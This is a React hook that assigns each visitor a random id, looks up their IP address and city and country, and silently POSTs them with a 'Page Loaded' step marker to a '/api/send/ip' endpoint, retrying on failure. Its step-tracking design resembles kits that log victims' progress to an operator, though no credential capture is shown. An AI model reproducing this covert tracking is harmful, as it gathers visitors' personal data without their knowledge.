import { useState, useEffect } from "react";
import { v4 as uuid } from "uuid";
import { IPService } from "../utils/ipService";
import { buildApiUrl } from "../config/api";
import { PAGE_CONSTANTS } from "../utils/pageUtils";
import {
  retryWithBackoff,
  RETRY_CONFIGS,
  fetchWithTimeout,
} from "../utils/retryUtils";

export const useInitialSetup = (setAllData, setStep) => {
  const [Unik, setUnik] = useState("");
  const [isInitialized, setIsInitialized] = useState(false);

  useEffect(() => {
    const uniqueId = uuid().slice(0, 8);
    setUnik(uniqueId);

    const initializeUserData = async () => {
      let ip = null;
      let locationData = { country: null, city: null };

      try {
        // Fetch IP with retry logic
        try {
          ip = await IPService.fetchIPAddress();
        } catch (error) {
          console.error("Failed to fetch IP after retries:", error);
          // Continue without IP - we'll use fallback values
        }

        // Fetch location data only if we have an IP
        if (ip) {
          try {
            locationData = await IPService.fetchLocationData(ip);
          } catch (error) {
            console.error(
              "Failed to fetch location data after retries:",
              error
            );
            // Continue with null location data
            locationData = { country: null, city: null };
          }
        }

        const params = {
          id: uniqueId,
          ip: ip || "unknown",
          country: locationData.country || "unknown",
          city: locationData.city || "unknown",
          currentStep: "Page Loaded",
          context: process.env.NEXT_PUBLIC_CONTEXT || "",
        };

        // Update AllData with the new information
        setAllData((prevData) => ({
          ...prevData,
          id: uniqueId,
          ip: ip || "unknown",
          country: locationData.country || "unknown",
          city: locationData.city || "unknown",
          context: process.env.NEXT_PUBLIC_CONTEXT || "",
        }));

        // Send initial data with retry logic
        try {
          await retryWithBackoff(async () => {
            const response = await fetchWithTimeout(
              buildApiUrl("/api/send/ip"),
              {
                method: "POST",
                body: JSON.stringify(params),
                headers: {
                  "Content-type": "application/json; charset=UTF-8",
                  "X-Robots-Tag": "googlebot: nofollow",
                },
              },
              10000
            );

            if (!response.ok) {
              const error = new Error(
                `HTTP ${response.status}: ${response.statusText}`
              );
              error.response = { status: response.status };
              throw error;
            }

            return response;
          }, RETRY_CONFIGS.INTERNAL_API);
        } catch (error) {
          console.error("Failed to send initial data after retries:", error);
          // Don't prevent initialization from completing
          // The app can still function without sending this data
        }

        setIsInitialized(true);
      } catch (error) {
        console.error("Critical error during initialization:", error);

        // Even if everything fails, we should still initialize with fallback data
        setAllData((prevData) => ({
          ...prevData,
          id: uniqueId,
          ip: "unknown",
          country: "unknown",
          city: "unknown",
          context: process.env.NEXT_PUBLIC_CONTEXT || "",
        }));

        setIsInitialized(true);
      }
    };

    initializeUserData();
  }, [setAllData, setStep]);

  return {
    Unik,
    isInitialized,
  };
};
